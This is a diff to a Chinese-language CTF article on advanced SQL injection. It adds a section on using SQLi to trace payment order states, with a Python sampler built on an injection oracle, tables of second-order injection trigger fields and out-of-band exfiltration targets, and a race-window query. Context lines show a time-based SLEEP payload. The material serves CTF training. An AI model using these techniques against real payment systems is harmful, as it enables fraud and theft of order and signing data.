@@ -43,7 +43,7 @@ tags:
   - "advanced"
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: []
+related_articles: ["ctf-website/24-database/01-sqli-fundamentals", "ctf-website/12-payment/payment-race-lost-update", "ctf-website/13-signature/06-replay-nonce"]
 ---
 # Advanced SQLi & WAF Bypass — 高级注入与绕过技术
 
@@ -398,6 +398,65 @@ UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
 
 `ORDER BY` 没有回显时可以用排序差异做布尔通道：True 时按 `id` 升序，False 时按 `name` 或常量排序；页面第一条记录变化就是 bit。
 
+## 10. SQLi 到支付状态机 Pivot
+
+高级 SQLi 在支付题里的价值不是“抽到 users 表”，而是进入订单状态机的内部视角：确认金额来源、状态迁移、幂等键、库存扣减和发货条件。
+
+| SQLi 能力 | 支付落点 | 打法 |
+|---|---|---|
+| 表名/列名枚举 | 找 `orders/pay_log/cards/wallet` | 建状态机图 |
+| 布尔盲注 | 判断订单是否存在、状态是否变化 | 与前台请求并排跑 |
+| 时间盲注 | 判断回调是否入库、队列是否消费 | 观察异步窗口 |
+| 二阶注入 | 昵称/地址/备注进入后台订单 SQL | 触发后台导出/搜索 |
+| UPDATE 注入 | 影响 `status/paid_at/delivered` | 找整行保存/字段覆盖 |
+| OOB | 外带 `notify_log.raw/sign/config` | 转签名/回调链 |
+
+### 10.1 订单状态机抽样脚本
+
+```python
+# sqli_order_state_sampler.py — 用 SQLi oracle 跟踪订单状态
+import json
+import time
+
+def sample_order(oracle, order_id):
+    fields = ["status", "amount", "paid_at", "delivered_at", "transaction_id"]
+    row = {}
+    for field in fields:
+        expr = f"(SELECT COALESCE(CAST({field} AS CHAR),'') FROM orders WHERE id={order_id} LIMIT 1)"
+        row[field] = oracle(expr)
+    return row
+
+def diff_rounds(oracle, order_id, action):
+    before = sample_order(oracle, order_id)
+    action()
+    time.sleep(1)
+    after = sample_order(oracle, order_id)
+    print(json.dumps({"before": before, "after": after}, ensure_ascii=False, indent=2))
+```
+
+### 10.2 二阶注入触发位
+
+| 写入字段 | 触发功能 | 常见 SQL 形态 | 成功样本 |
+|---|---|---|---|
+| 订单备注 | 商家后台搜索/导出 | `WHERE remark LIKE '%...%'` | 导出报错/延迟 |
+| 收货邮箱 | 邮件队列拼接 | `SELECT ... WHERE email='$email'` | 队列消费延迟 |
+| 优惠券码 | 结算重算 | `WHERE code='$coupon'` | 金额/折扣变化 |
+| 商品名 | 订单列表排序 | `ORDER BY $sort` / `LIKE` | 排序差异 |
+| 回调 raw body | 管理后台日志查询 | `WHERE raw LIKE '%...%'` | 后台触发 |
+
+### 10.3 数据库锁与竞态窗口
+
+支付竞态要同时看 HTTP 响应和数据库写入顺序。SQLi 能提供一个“内部时钟”：
+
+```sql
+-- 判断订单是否在同一事务内先发货后扣款
+SELECT CONCAT(status, ':', balance, ':', delivered_at)
+FROM orders JOIN users ON orders.user_id=users.id
+WHERE orders.id=123;
+```
+
+如果并发后出现 `delivered_at` 已写入但 `balance` 未扣、`pay_log` 重复但 `orders.status` 只变一次、或 `stock` 负数，直接转 `payment-race-lost-update.md`。Evidence 用 `race_sql_timeline.jsonl` 保存每轮并发的 SQL 观察值。
+
 ## 攻击链 / 工作流
 
 ```
@@ -408,6 +467,7 @@ UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
 5. 对每种绕过只保留最小可验证 payload，并记录触发条件
 6. 如果 payload 需要外带通道，保存 DNS/HTTP listener 原始日志作为证据
 7. 输出 WAF 规则假设、可绕过语法族、最小通过 payload 和失败样本
+8. 支付题继续抽订单状态机、回调日志、发货表和余额流水，和业务请求做时间线对齐
 ```
 
 ## Evidence
@@ -418,6 +478,7 @@ UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
 | 二阶注入 | 写入点请求、触发点请求、延迟或报错输出 |
 | OOB 注入 | DNS/HTTP/SMB listener 日志、唯一 token |
 | 非 SELECT 注入 | INSERT/UPDATE/ORDER BY/LIMIT 的最小触发语句 |
+| 支付状态机 | SQLi 观察到的订单/流水/余额/库存时间线 |
 
 ## MCP 工具映射
 
@@ -428,7 +489,7 @@ UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
 | 工具执行 | `run_ctf_tool` | 调用 sqlmap tamper、dnslog/自定义脚本 |
 | 证据记录 | `workspace_write_text` | 保存绕过矩阵和外带日志 |
 
-## 9. 关联技术
+## 11. 关联技术
 
 - [[01-sqli-fundamentals]] — SQL 注入基础
 - [[03-nosql-injection]] — NoSQL 注入
